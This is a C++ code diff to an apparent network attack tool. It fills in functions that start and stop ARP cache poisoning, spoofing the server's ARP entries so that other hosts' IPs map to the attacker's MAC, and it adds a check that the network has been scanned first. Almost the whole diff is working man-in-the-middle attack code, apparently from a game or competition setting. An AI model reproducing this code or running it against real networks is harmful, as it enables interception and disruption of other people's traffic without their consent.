@@ -78,13 +78,18 @@ void CommandManager::StartPoisonEnemies(std::string message) {
     enemy_poison_task_->Stop();
   }
 
+  if (enemy_arp_table.size() == 0) {
+    std::cout << "No enemy addresses found, have you scanned the network?";
+    std::cout << std::endl;
+    return;
+  }
+
   char* spoof_ip = strdup(server_ip.c_str());
   char* spoof_mac = (char*) "1337420b142e";
   std::unordered_map<char*, char*> spoof_addresses = {
     {spoof_ip, spoof_mac}
   };
   u_long duration = 5;
-
 
   enemy_poison_task_ = std::unique_ptr<PoisonTask>(
     new PoisonTask(enemy_arp_table, spoof_addresses, duration));
@@ -107,10 +112,47 @@ void CommandManager::StopPoisonEnemies(std::string message) {
 
 void CommandManager::StartPoisonServer(std::string message) {
   // Start poisoning the server (enemy IPs to our MAC)
+  if (server_poison_task_ != nullptr && server_poison_task_->IsRunning()) {
+    std::cout << "Stopping previous poison server attack..." << std::endl;
+    server_poison_task_->Stop();
+  }
+
+  if (server_mac == NULL) {
+    std::cout << "No server MAC found, have you scanned the network?";
+    std::cout << std::endl;
+    return;
+  }
+
+  char* spoof_mac = our_mac;
+  std::unordered_map<char*,char*> victim_address = {
+    {strdup(server_ip.c_str()), server_mac}
+  };
+  std::unordered_map<char*, char*> spoof_addresses;
+
+  for (auto& it : enemy_arp_table) {
+    char* spoof_ip = it.first;
+    spoof_addresses.insert({spoof_ip, spoof_mac});
+  }
+
+  u_long duration = 5;
+
+  server_poison_task_ = std::unique_ptr<PoisonTask>(
+    new PoisonTask(victim_address, spoof_addresses, duration));
+
+  if (server_poison_task_->Start()) {
+    std::cout << "Poison server attack now running in background" << std::endl;
+  }
 }
 
 void CommandManager::StopPoisonServer(std::string message) {
   // Stop poisoning the server
+  if (server_poison_task_ == nullptr || !server_poison_task_->IsRunning()) {
+    std::cout << "No poison server task was running" << std::endl;
+    return;
+  }
+
+  std::cout << "Stopping poison server attack..." << std::endl;
+  server_poison_task_->Stop();
 }
 
 void CommandManager::AutomatedAttack(std::string message) {
